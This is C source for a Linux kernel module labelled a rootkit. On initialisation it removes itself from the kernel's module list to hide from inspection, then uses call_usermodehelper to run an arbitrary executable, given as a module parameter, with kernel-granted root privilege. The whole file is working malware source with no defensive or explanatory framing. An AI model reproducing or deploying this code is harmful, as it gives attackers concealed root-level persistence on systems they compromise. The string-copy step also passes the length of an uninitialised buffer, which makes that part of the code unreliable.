#include "common.h"
#include "linux/printk.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");

static struct list_head * prev_module;

// Function to hide the module
static void hide_module(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

/* String parameter */
static char * program_cwd = "";
module_param(program_cwd, charp, 0644);
MODULE_PARM_DESC(program_cwd, "CWD for program");

static char * program_path = "";
module_param(program_path, charp, 0644);
MODULE_PARM_DESC(program_path, "Path to the executable");

static void run_rootkit(void) {
    printk("Rootkit: start runnig\n");
    if (strlen(program_path) == 0 || strlen(program_cwd) == 0) return;

    // cwd_prefix + program_pwd
    char * cwd_prefix = "--cwd=";
    char pwd_buff[256];
    char pwd_res[256];
    strscpy(pwd_buff, program_cwd, strlen(pwd_buff) - 1);
    snprintf(pwd_res, sizeof(pwd_res), "%s%s", cwd_prefix, pwd_buff);

    printk("Rootkit: cwd_arg:%s\n", pwd_res);


    // Define args and working environment
    char *argv[] = { program_path, pwd_res, NULL };
    char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    };

    printk("Rootkit: Executing\n");
    // Run executable
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

    if (ret != 0)
        printk("Rootkit: Failed to launch program: %d\n", ret);
    else
        printk("Rootkit: Program launched successfully\n");
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded!\n");
    hide_module();
    run_rootkit();

    return 0;
}

static void __exit rootkit_exit(void) {
}

module_init(rootkit_init);
module_exit(rootkit_exit);
